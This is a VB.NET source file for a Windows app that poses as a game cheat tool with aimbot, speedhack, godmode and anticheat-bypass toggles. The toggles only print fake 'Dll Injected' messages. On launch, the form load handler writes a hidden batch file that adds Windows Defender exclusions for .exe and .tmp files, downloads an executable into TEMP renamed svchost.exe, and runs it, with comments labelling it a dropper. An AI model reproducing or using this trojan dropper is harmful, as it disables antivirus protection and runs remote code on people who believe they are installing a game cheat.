Imports System.IO

Public Class Form1






    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then



            RichTextBox1.AppendText(vbNewLine + "SeeLootHack Dll Injected" + vbNewLine)
        Else
            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)

        End If

    End Sub



    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then

            RichTextBox1.AppendText(vbNewLine + "SpeedHack Dll Injected" + vbNewLine)
        Else
            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)

        End If

    End Sub

    Private Sub Aimbot_CheckedChanged(sender As Object, e As EventArgs) Handles Aimbot.CheckedChanged
        If Aimbot.Checked = True Then

            RichTextBox1.AppendText(vbNewLine + "AimBot Dll Injected" + vbNewLine)
        Else
            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)

        End If

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        RichTextBox1.AppendText(vbNewLine + "Loading All Scripts" + vbNewLine)
        Dim ask As String = MessageBox.Show("Do you want to bypass anticheat Detection", "bypass", MessageBoxButtons.YesNo)
        If ask = vbYes Then
            RichTextBox1.AppendText(vbNewLine + "AntiCheat bypass script loaded" + vbNewLine)

        End If

    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then

            RichTextBox1.AppendText(vbNewLine + "GodMode Dll Injected" + vbNewLine)
        Else
            RichTextBox1.AppendText("Script Unloaded" + vbNewLine)

        End If

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MessageBox.Show("Installing Some Modules(will take 1m or less)", "INSTALLATION", MessageBoxButtons.OK)
        Dim file As System.IO.StreamWriter
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim FullFileName As String = Path.Combine(appDataPath, "calculator.bat")
        file = My.Computer.FileSystem.OpenTextFileWriter(FullFileName, True)
        ' this is simple Dropper
        'somejunkcode"
        'svdsvsdvdsvdsvsdvdsvds
        ' dsvsvdsvsdvdsvdsvdsvsdvs
        'svdsvsdvdsvdsvdsvdsvdsvdsvs
        'sdvvdsvdsvsdvdsvdsvdsvdsvds
        ' vsdvdsvdsvsvdsvsd
        'sdvdsvdsvdsvds
        'Isdvdsvdsvdsvdsvsd
        'vdfgvfdsvdsvsdv


        file.WriteLine("")
        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .tmp """)
        file.WriteLine("")
        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .exe """)
        file.WriteLine("")
        file.WriteLine("powershell -c Start-BitsTransfer -priority foreground -Source https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -Destination $Env:TMP\svchost.exe -ErrorAction SilentlyContinue")
        file.WriteLine("")
        file.WriteLine("cd %TEMP%")
        file.WriteLine("")
        file.WriteLine("timeout 25")

        file.WriteLine("")

        file.WriteLine("start svchost.exe")
        file.Close()


        ' this is simple Dropper
        'somejunkcode"
        'svdsvsdvdsvdsvsdvdsvds
        ' dsvsvdsvsdvdsvdsvdsvsdvs
        'svdsvsdvdsvdsvdsvdsvdsvdsvs
        'sdvvdsvdsvsdvdsvdsvdsvdsvds
        ' vsdvdsvdsvsvdsvsd
        'sdvdsvdsvdsvds
        'Isdvdsvdsvdsvdsvsd
        'vdfgvfdsvdsvsdv

        Shell("cmd /c "" cd %APPDATA% &&  calculator.bat """, AppWinStyle.Hide, True)

    End Sub
End Class
